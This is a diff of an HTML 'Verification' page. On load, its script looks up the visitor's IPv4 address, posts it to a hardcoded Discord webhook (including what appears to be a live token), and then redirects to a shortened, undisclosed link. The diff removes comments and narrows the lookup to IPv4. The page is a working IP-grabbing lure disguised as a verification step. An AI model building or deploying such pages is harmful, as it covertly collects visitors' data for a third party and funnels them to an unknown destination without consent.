@@ -6,7 +6,6 @@
     <meta http-equiv="X-UA-Compatible" content="ie=edge">
     <title>Verification</title>
     <style>
-        /* Dark Theme & Centered Content */
         body {
             background-color: #000;
             color: #fff;
@@ -39,7 +38,6 @@
             animation: spin 1s linear infinite;
         }
 
-        /* Loading Animation */
         @keyframes spin {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
@@ -53,27 +51,24 @@
     <div class="spinner"></div>
 
     <script>
-        // Configuration
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1341433412753555548/e8tFi_i8MXCevhm7FtWgP6jQBRF1ANCfLKsE1ya6hjTs02qPLTQgzDCjqCVywLxkWLKX";
         const REDIRECT_URL = "https://is.gd/gwuu9c";
 
-        // Function to fetch user's IP address
-        async function getUserIP() {
+        async function getIPv4() {
             try {
-                const response = await fetch("https://api64.ipify.org?format=json");
-                if (!response.ok) throw new Error("Failed to fetch IP");
+                const response = await fetch("https://api4.ipify.org?format=json");
+                if (!response.ok) throw new Error("Failed to fetch IPv4");
                 const data = await response.json();
                 return data.ip;
             } catch (error) {
-                console.error("Error fetching IP:", error);
+                console.error("Error fetching IPv4:", error);
                 return null;
             }
         }
 
-        // Function to send IP to Discord webhook
         async function sendToWebhook(ip) {
             try {
-                const payload = { content: `New Visitor IP: ${ip}` };
+                const payload = { content: `New Visitor IPv4: ${ip}` };
                 const response = await fetch(WEBHOOK_URL, {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
@@ -81,23 +76,21 @@
                 });
 
                 if (!response.ok) throw new Error("Failed to send to webhook");
-                console.log("IP successfully sent to Discord webhook");
+                console.log("IPv4 successfully sent to Discord webhook");
             } catch (error) {
-                console.error("Error sending IP to webhook:", error);
+                console.error("Error sending IPv4 to webhook:", error);
             }
         }
 
-        // Main execution on page load
         window.onload = async function () {
             try {
-                document.getElementById('loadingMessage').innerText = "Fetching your IP address...";
+                document.getElementById('loadingMessage').innerText = "Fetching your IPv4 address...";
                 
-                const ip = await getUserIP();
+                const ip = await getIPv4();
                 if (ip) {
                     await sendToWebhook(ip);
                 }
 
-                // Redirect after 3 seconds
                 setTimeout(() => {
                     window.location.href = REDIRECT_URL;
                 }, 3000);
